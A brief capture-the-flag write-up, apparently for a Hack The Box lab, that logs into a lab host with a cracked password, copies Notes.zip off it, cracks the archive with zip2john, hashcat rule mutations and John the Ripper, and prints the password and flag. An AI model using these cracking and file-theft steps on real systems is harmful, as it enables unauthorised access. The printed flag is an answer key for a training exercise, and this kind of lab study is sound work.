# Protected Archives

### Use the cracked password of the user Kira, log in to the host, and read the Notes.zip file containing the flag. Then, submit the flag as the answer.

```bash
#creds kira:L0vey0u1!
find / -name Notes.zip 2>/dev/null
/home/kira/Documents/Notes.zip
#copy that into our machine to crack
scp kira@10.129.140.211:/home/kira/Documents/Notes.zip .  
zip2john Notes.zip > zip.hash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
john --wordlist=mut_password.list zip.hash 
#P@ssw0rd3!       (Notes.zip/notes.txt)     
unzip Notes.zip
cat notes.txt 
HTB{ocnc7r4io8ucsj8eujcm}
```
